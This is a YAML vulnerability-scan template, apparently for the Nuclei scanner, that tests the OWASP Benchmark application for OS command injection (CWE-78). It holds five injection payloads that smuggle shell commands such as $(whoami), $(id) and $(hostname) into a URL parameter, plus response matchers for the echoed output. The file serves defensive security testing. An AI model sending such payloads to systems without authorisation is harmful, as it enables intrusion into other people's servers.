id: CWE-78-OWASP-Benchmark

info:
  name: OWASP Benchmark CWE-78 Command Injection
  author: security-researcher
  severity: critical
  description: "Kiểm thử lỗ hổng Command Injection trong OWASP Benchmark"
  reference: 
    - https://cwe.mitre.org/data/definitions/78.html
    - https://owasp.org/www-project-benchmark/
  tags: cwe,cwe-78,command-injection,owasp,benchmark

http:
  - method: GET
    path:
      - "{{BaseURL}}={{payload}}"

    payloads:
      payload:
        - "; echo VULNERABLE_CWE78_$(whoami) ;"
        - "| echo VULNERABLE_CWE78_$(id) |"
        - "&& echo VULNERABLE_CWE78_$(hostname) &&"
        - "'; echo VULNERABLE_CWE78 ;'"
        - "\"; echo VULNERABLE_CWE78 ;\""

    matchers:
      - type: word
        part: body
        words:
          - "VULNERABLE_CWE78_"
          - "uid="
          - "gid="
        condition: or
